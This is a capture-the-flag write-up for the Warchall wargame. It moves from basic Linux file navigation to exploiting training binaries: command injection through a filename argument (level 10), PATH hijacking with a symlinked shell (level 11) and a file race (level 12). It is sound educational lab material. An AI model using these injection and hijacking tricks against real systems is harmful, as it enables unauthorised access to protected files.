# Warchall-challenge
#
> To start with, I create an SSH account and then connect to the account I've just created by using a terminal.
# 1. The Beginning
### For this level we are asked to search for 6 hidden passwords (level 0-5) in various files
## *LEVEL 0*
#### At the very beginning, I display the contents of the WELCOME.md file with the command :
```
cat WELCOME.md
```
>  **_cat command_** lets you view the contents of a file

#### In this file they welcome me and tell me that I will find the solutions in the level directory. So I go there by typing :
```
cd /home/level/
```
#### Now I'm running a command to list existing files:
```
ls -al
```
> Linux **_ls -a command_**, show all files and subdirectories in the current directory, including hidden files and **_ls -l command_**, display detailed information of non-hidden files and directories
#### Then I go to the 00_welcome folder, where there's a README.md file in which the first password is stored
```
cd 00_welcome/
```
```
cat README.md
```
## *LEVEL 1*
#### The file containing the level 1 solution is hidden in one of the many subfolders in the **_01_choice_tree_** directory. I used these commands to access it:
```
cd /home/level/01_choice_tree/
```
```
ls -al
```
```
cd ......
```
#### After rummaging through the folders using cd, cat and ls I found the file containing the password in the folder named **_patience_** which is a sub-subfolder of **_blue_** and display the file contents with :
```
cat SOLUTION.txt
```
## *LEVEL 2*
#### To find the password for this level, you need to explore the hidden folders and files.
> here's how I got here.
```
cd /home/.porb/
```
> The **dot** means it's a hidden folder/file
#### And this is how i recovered the password, which is in a **_.porb_** file :
```
cat .solution
```
## *LEVEL 3*
#### For this level I just need to go to folder **_03_** to find the solution, which is located in the file called  **_.bash_history_**
> As for the last level, I use the same commands to move around a folder, to find out what the folder contains and to read the contents of a file.
```
cd /home/level/03/
```
```
cat .bash_history
```
## *LEVEL 4*
#### Here, when you enter the **_04_kwisatz_** folder, you only see one file that says "Look in your ~".
> The **~** in linux designates the personal directory
#### I then find another file with a password named README2.md, using an absolute path like this :
```
cd /home/user/username/level/04_kwisatz/
```
#### I use the **_cat_** command to read its contents 
## *LEVEL 5*
> The last password to be found to validate **"Beginning"** is the one from this level 5. 
#### So I enter into the **_05_privacy_** directory and the only file it contains is where the password is located
```
cd 05_privacy/
```
```
cat README.md
```
### To sum up, for this challenge we mainly used basic commands to be able to move in folders at different stages, to look at what they contain, even if it's hidden, and to read the contents of a file.

# 2. Choose your Path
> This is the level 10 mini challenge found in /home/level/10_choose_your_path/
### in the *10_choose_your_path* folder there is a file named *charp.c* which contains C language source code that counts the number of characters per line in a file. 
#### Here's the command I used to capture this level's flag:
``` C
./charp "solution.txt; cat solution.txt> ~/expected.txt"
```
> * **./charp** is a command line instruction for a C program
> * This command will run the **charp** program with **solution.txt** as an argument and write it's contents to a file named **expected.txt** in  home directory.
#### After executing this I return go to the home directory :
```
cd
```
#### And then I open the file containing the flag :
```
cat expected.txt
```
# 3. Choose your Path II
>  A level 11 mini challenge found in /home/level/11_choose_your_path2/
### If you look at what's in the folder *11_choose_your_path2* with the ls command, you'll see that it's similar to the previous level in term of content, but their source code are different.
### The script contained in charp2.c is also C code. It's escapes single quotes in a string, single quotes are used to enclose the filename when passed to the wc command.
#### To access to the solution, I used these commands :
``` 
ln -s /bin/sh ~/wc
```
``` 
PATH=~ ./charp2 "/bin/cat solution.txt 1>&2"
```
> * The **ln** command creates a symbolic link named **wc** in home directory that points to the /bin/sh file.
> * The charp2 is a C program that reads a command from the standard input and executes it using the shell interpreter.
> * The PATH environment variable is set to the current directory, and then the charp2 program is executed with the arguments "/bin/cat solution.txt 1>&2".
> * The "/bin/cat solution.txt 1>&2" argument specifies that the **cat** command should be executed with the *solution.txt* file as input and the output should be redirected to the standard error stream. The 1>&2 redirection operator redirects the standard output stream to the standard error stream.
# 4. Py-Tong
> This is the level 12 found in /home/level/12_pytong/
### how i solved this level?
* First I created a shell script that I named **test.sh** who uses a while loop to write the string “Contenu 1” to a file I named *new* in an infinite loop :
```
 nano test.sh
```
```
 #!/bin/bash

while true; do
    echo "example" >> new

done
```
> * This Bash script use a while loop to write the string “example” to a file named new in an infinite loop.
> * The script will continue to run until it is manually stopped.
*Next, I create the file new while still in the home directory :
```
touch new
```
>la commande **touch**peut être utilisée pour créer un fichier vide sans contenu(avec Linux).
* Once the empty file has been created, I can use the command to run the script :
```
./test.sh
```
* At the same time as the script is running, I open another terminal in which I go to the directory /home/level/12_pytong/ where I execute the following command to display the hidden password
```
./pytong /home/user/username/new
```
